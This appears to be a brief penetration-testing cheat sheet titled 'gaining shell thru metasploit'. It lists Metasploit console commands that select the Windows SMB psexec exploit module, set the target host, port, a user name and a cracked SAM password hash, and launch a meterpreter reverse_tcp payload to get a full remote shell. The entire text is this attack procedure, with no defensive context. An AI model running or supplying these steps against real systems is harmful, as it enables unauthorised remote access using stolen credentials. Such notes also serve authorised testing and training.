**gaining shell thru metasploit**
full shell

search psexec smb type: exploit
use exploit/windows/smb/psexec

set rhost (target host)
rport <specific smb port>
set smbpass <cracked SAM hash>
set smbuser <host user>
set payload windows/x64/meterpreter/reverse_tcp
run